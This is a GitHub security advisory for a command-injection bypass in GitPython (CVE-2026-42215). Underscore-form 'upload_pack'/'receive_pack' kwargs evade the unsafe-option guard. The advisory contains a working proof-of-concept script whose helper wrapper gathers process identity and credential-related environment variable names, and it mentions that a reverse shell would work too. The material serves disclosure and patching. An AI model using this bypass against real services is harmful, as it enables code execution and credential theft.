# [H] GitPython has Command Injection via Git options bypass

## Summary
Severity: High
Advisory: GHSA-rpm5-65cw-6hj4
CVE: CVE-2026-42215
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-25
Source: https://github.com/advisories/GHSA-rpm5-65cw-6hj4
Type: github-advisory

## Affected
- PyPI: `GitPython` — affected >=3.1.30 <3.1.47

## Details
### Summary
GitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.

### Details
GitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:

- `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe.
- `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.

The vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:

- `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390`
- `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071`
- `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125`
- `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`

That validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.

Later, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:

- `upload_pack=...` becomes `--upload-pack=...`
- `receive_pack=...` becomes `--receive-pack=...`

Because the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.

In practice:

- `remote.fetch(**{"upload-pack": helper})` is blocked with `UnsafeOptionError`
- `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution

The same bypass works for:

```python
Repo.clone_from(origin, out, upload_pack=helper)
repo.remote("origin").fetch(upload_pack=helper)
repo.remote("origin").pull(upload_pack=helper)
repo.remote("origin").push(receive_pack=helper)
```

This does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.

Existing tests cover the hyphenated form, not the vulnerable underscore form. For example:

- `test/test_clone.py:129-136` checks `{"upload-pack": ...}`
- `test/test_remote.py:830-833` checks `{"upload-pack": ...}`
- `test/test_remote.py:968-975` checks `{"receive-pack": ...}`

Those tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.

### PoC
1. Create and activate a virtual environment in the repository root:

```bash
python3 -m venv .venv-sec
.venv-sec/bin/pip install setuptools gitdb
source ./.venv-sec/bin/activate
```

2. make a new python file and put the following in there, then run it:

```python
import os
import stat
import subprocess
import tempfile

from git import Repo
from git.exc import UnsafeOptionError

# Setup: create isolated repositories so the PoC uses a normal fetch flow.
base = tempfile.mkdtemp(prefix="gp-poc-risk-")
origin = os.path.join(base, "origin.git")
producer = os.path.join(base, "producer")
victim = os.path.join(base, "victim")
proof = os.path.join(base, "proof.txt")
wrapper = os.path.join(base, "wrapper.sh")

# Setup: this wrapper is just to demo things you can do, not required for the exploit to work
# you could also do something like an SSH reverse shell, really anything
with open(wrapper, "w") as f:
    f.write(f"""#!/bin/sh
{{
  echo "code_exec=1"
  echo "whoami=$(id)"
  echo "cwd=$(pwd)"
  echo "uname=$(uname -a)"
  printf 'argv='; printf '<%s>' "$@"; echo
  env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=<redacted>/' || true
}} > '{proof}'
exec git-upload-pack "$@"
""")
os.chmod(wrapper, stat.S_IRWXU)

subprocess.run(["git", "init", "--bare", origin], check=True, stdout=subprocess.DEVNULL)
subprocess.run(["git", "clone", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

with open(os.path.join(producer, "README"), "w") as f:
    f.write("x")

subprocess.run(["git", "-C", producer, "add", "README"], check=True, stdout=subprocess.DEVNULL)
subprocess.run(
    ["git", "-C", producer, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-m", "init"],
    check=True,
    stdout=subprocess.DEVNULL,
)
subprocess.run(["git", "-C", producer, "push", "origin", "HEAD"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.run(["git", "clone", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

repo = Repo(victim)
remote = repo.remote("origin")

# the literal Git option name is properly blocked.
try:
    remote.fetch(**{"upload-pack": wrapper})
    print("control=unexpected_success")
except UnsafeOptionError:
    print("control=blocked")

# this is the actual vulnerability
# you can also just do upload_pack="touch /tmp/proof", the wrapper is just to show greater impact
# if you do the "touch /tmp/proof" the script will crash, but the file will have been created
remote.fetch(upload_pack=wrapper)

# Proof: the helper ran as the GitPython host process.
print("proof_exists", os.path.exists(proof), proof)
print(open(proof).read())
```

3. Expected result:

- The script prints `control=blocked`
- The script prints `proof_exists True ...`
- The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names

Example output:

```bash
GitPython % python3 test.py
control=blocked
proof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt
code_exec=1
whoami=uid=501(wes) gid=20(staff) <redacted>
cwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim
uname=Darwin  <redacted> Darwin Kernel Version  <redacted>; root:xnu-11417. <redacted>
argv=</var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git>
USER=<redacted>
SSH_AUTH_SOCK=<redacted>
PATH=<redacted>
HOME=<redacted>
```

This PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.

### Impact
Who is impacted:
- Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior
- Systems that accept a user-provided dict of "extra Git options" and pass it into GitPython with `**kwargs`
- CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )

What the attacker needs to control:

- A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`

From a severity perspective, this could lead to
- Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process
- Modification of repositories, build outputs, or release artifacts
- Lateral movement from CI/CD workers or automation hosts
- Full compromise of the worker or service process handling repository operations

The highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.

## References
- https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rpm5-65cw-6hj4
- https://nvd.nist.gov/vuln/detail/CVE-2026-42215
- https://github.com/gitpython-developers/GitPython
- https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47
